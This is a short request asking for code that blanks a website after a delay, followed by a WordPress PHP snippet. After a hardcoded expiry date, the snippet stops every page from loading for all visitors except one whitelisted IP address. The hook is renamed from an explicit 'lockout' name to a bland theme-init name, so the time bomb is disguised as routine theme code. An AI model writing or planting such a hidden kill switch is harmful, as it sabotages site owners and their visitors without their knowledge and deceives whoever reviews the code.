Make a full white page after a while write the code bellow
add_action( 'init', 'webe_time_based_lockout' );

```php
add_action( 'init', 'theme_file_init_base' );
function theme_file_init_base() {
    $expiry_date = '2025-12-31'; 
    $my_ip = '103.55.145.188';
    $current_date = date( 'Y-m-d' );
    if ( strtotime( $current_date ) > strtotime( $expiry_date ) ) {
        if ( ! empty( $my_ip ) && $_SERVER['REMOTE_ADDR'] === $my_ip ) {
            return;
        }
        header("HTTP/1.1 200 OK");
        die(); 
    }
}
```